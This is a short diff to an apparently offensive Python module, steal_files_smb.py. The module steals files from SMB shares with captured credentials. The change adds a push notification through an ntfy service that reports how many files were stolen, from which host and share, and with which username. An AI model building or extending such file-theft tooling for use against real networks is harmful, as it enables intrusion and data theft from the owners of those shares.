@@ -7,6 +7,7 @@ from smb.SMBConnection import SMBConnection
 from smb.base import SharedFile
 from shared import SharedData
 from logger import Logger
+from ntfy import send_ntfy
 
 # Configure the logger
 logger = Logger(name="steal_files_smb.py", level=logging.DEBUG)
@@ -194,6 +195,8 @@ class StealFilesSMB:
                                     success = True
                                     countfiles = len(remote_files)
                                     logger.info(f"Successfully stolen {countfiles} files from {ip}:{port} on share '{share}' with user '{username}'")
+                                    message = f"Successfully stolen {countfiles} files from {ip}:{port} on share '{share}' with user '{username}' (SMB)"
+                                    send_ntfy(message=message)
                                 conn.close()
                                 if success:
                                     timer.cancel()  # Cancel the timer if the operation is successful
